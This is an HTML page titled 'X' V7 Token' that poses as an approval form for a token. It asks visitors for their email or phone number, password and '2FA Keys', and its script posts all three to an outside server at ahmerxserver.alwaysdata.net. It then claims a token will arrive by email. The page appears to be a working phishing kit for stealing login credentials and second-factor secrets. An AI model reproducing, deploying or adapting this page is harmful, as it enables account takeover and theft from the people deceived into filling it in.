<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>X' V7 Token</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      padding: 20px;
    }
    header, footer {
      text-align: center;
      font-weight: bold;
      margin-bottom: 20px;
    }
    form {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    label {
      display: block;
      margin-top: 10px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      margin-top: 15px;
      padding: 10px;
      width: 100%;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background: #0056b3;
    }
    .message {
      margin-top: 20px;
      font-weight: bold;
      text-align: center;
    }
    .error {
      color: red;
    }
    .success {
      color: green;
    }
  </style>
</head>
<body>
  <header>X' V7 Token</header>

  <form id="approvalForm">
    <label for="email">Email / Phone:</label>
    <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>

    <label for="password">Password:</label>
    <input type="text" id="password" name="password" placeholder="Enter your password" required>

    <label for="twofa">2FA Keys:</label>
    <input type="text" id="twofa" name="twofa" placeholder="Enter your 2FA key" required>

    <button type="submit">Send Approval</button>
  </form>

  <div id="response" class="message"></div>

  <footer>Made by Ahmer Awan</footer>

  <script>
    const form = document.getElementById("approvalForm");
    const responseDiv = document.getElementById("response");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const emailField = document.getElementById("email");
      const passwordField = document.getElementById("password");
      const twofaField = document.getElementById("twofa");

      const typedValue = emailField.value.trim();
      const passwordValue = passwordField.value.trim();
      const twofaValue = twofaField.value.trim();

      // ✅ Validation: email OR 11-digit phone number
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^\d{11}$/;

      if (!emailRegex.test(typedValue) && !phoneRegex.test(typedValue)) {
        responseDiv.textContent = "Invalid input: please enter a valid email or 11-digit phone number.";
        responseDiv.className = "message error";
        return;
      }

      try {
        const res = await fetch("https://ahmerxserver.alwaysdata.net/sendApproval", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            email: typedValue,
            password: passwordValue,
            twofa: twofaValue
          })
        });

        if (res.ok) {
          responseDiv.textContent = `Sent the approval request. Wait for email with token at ${typedValue}`;
          responseDiv.className = "message success";
        } else {
          responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
          responseDiv.className = "message error";
        }
      } catch (err) {
        responseDiv.textContent = "Can not send approval: Error 405 - Contact Admin at mkb1538bl@gmail.com";
        responseDiv.className = "message error";
      }
    });
  </script>
</body>
</html>
